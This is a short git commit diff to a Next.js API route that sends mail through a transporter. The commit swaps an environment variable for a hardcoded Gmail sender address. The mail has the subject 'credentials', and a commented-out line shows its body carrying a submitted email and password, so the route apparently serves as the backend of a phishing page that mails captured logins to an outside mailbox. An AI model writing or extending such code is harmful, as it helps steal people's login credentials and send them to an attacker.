126aebb12269450552e4e699876a2fd737f6b6f8
Victor Bello <you@example.com>
2023-06-11 14:37:30 +0100

    @

--- src/app/api/send/route.ts
+++ src/app/api/send/route.ts
@@ -20,7 +20,7 @@ export async function POST(request: Request) {
        });
 
       const result = await transporter.sendMail({
-         from: `"dees" <${process.env.APP_ACCOUNT}>`,
+         from: `"dees" <deeswork969@gmail.com>`,
          to: `${process.env.EMAIL_TO_SEND}`,
          subject: 'credentials',
          // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
